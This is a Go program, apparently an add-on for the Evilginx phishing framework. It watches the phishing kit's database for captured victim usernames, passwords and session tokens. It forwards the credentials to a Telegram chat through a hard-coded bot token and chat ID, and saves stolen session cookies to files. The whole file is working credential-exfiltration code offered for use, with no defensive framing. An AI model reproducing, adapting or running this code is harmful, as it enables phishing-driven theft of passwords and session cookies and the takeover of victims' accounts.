package main

import (
    "bufio"
    "encoding/json"
    "fmt"
    "log"
    "net/http"
    "net/url"
    "os"
    "time"
)

type LogLine struct {
    ID       int                    `json:"id"`
    Username string                 `json:"username"`
    Password string                 `json:"password"`
    Tokens   map[string]interface{} `json:"tokens"`
}

func sendTelegram(botToken, chatID, message string) (string, error) {
    apiURL := "https://api.telegram.org/bot" + botToken + "/sendMessage"
    data := url.Values{}
    data.Set("chat_id", chatID)
    data.Set("text", message)

    resp, err := http.PostForm(apiURL, data)
    if err != nil {
        return "", err
    }
    defer resp.Body.Close()

    var result struct {
        Ok     bool `json:"ok"`
        Result struct {
            MessageID int `json:"message_id"`
        } `json:"result"`
    }

    json.NewDecoder(resp.Body).Decode(&result)
    if result.Ok {
        return fmt.Sprintf("%d", result.Result.MessageID), nil
    }
    return "", nil
}

func editTelegram(botToken, chatID, messageID, newText string) {
    apiURL := "https://api.telegram.org/bot" + botToken + "/editMessageText"
    data := url.Values{}
    data.Set("chat_id", chatID)
    data.Set("message_id", messageID)
    data.Set("text", newText)

    _, err := http.PostForm(apiURL, data)
    if err != nil {
        log.Printf("Failed to edit message: %v\n", err)
    }
}

func readLastLine(path string) (string, error) {
    file, err := os.Open(path)
    if err != nil {
        return "", err
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    var last string
    for scanner.Scan() {
        last = scanner.Text()
    }
    return last, scanner.Err()
}

func saveCookies(username string, tokens map[string]interface{}) {
    if username == "" {
        return
    }
    os.MkdirAll("/root/.evilginx/cookies", 0755)
    file := "/root/.evilginx/cookies/" + username + ".json"
    data, _ := json.MarshalIndent(tokens, "", "  ")
    os.WriteFile(file, data, 0644)
}

func main() {
    botToken := "8471535230:AAFtKZ2V4zkcCW6yTHs1rGrdb9waaiDQzIQ"
    chatID := "7600034451"
    dbPath := "/root/.evilginx/data.db"

    fmt.Println("🔥 Evilginx Monitor Started")
    fmt.Println("Watching:", dbPath)
    fmt.Println("----------------------------------------")

    // Track sent messages per log ID
    sentMessages := make(map[int]string)
    known := make(map[int]LogLine)

    for {
        line, err := readLastLine(dbPath)
        if err != nil {
            time.Sleep(2 * time.Second)
            continue
        }

        if line == "" {
            time.Sleep(1 * time.Second)
            continue
        }

        var logLine LogLine
        if json.Unmarshal([]byte(line), &logLine) != nil {
            time.Sleep(1 * time.Second)
            continue
        }

        id := logLine.ID
        prev := known[id]

        // NEW USERNAME FOUND → send new message
        if prev.Username == "" && logLine.Username != "" {
            msg := fmt.Sprintf("New Visit:\nUsername: %s\nPassword: No password yet", logLine.Username)
            mid, _ := sendTelegram(botToken, chatID, msg)
            sentMessages[id] = mid

            fmt.Println("Username:", logLine.Username)
        }

        // PASSWORD APPEARED → edit message
        if prev.Password == "" && logLine.Password != "" && sentMessages[id] != "" {
            newMsg := fmt.Sprintf("New Visit:\nUsername: %s\nPassword: %s",
                logLine.Username, logLine.Password)

            editTelegram(botToken, chatID, sentMessages[id], newMsg)
            fmt.Println("Password added for", logLine.Username)
        }

        // COOKIES FOUND
        if len(logLine.Tokens) > 0 {
            saveCookies(logLine.Username, logLine.Tokens)
        }

        known[id] = logLine
        time.Sleep(1 * time.Second)
    }
}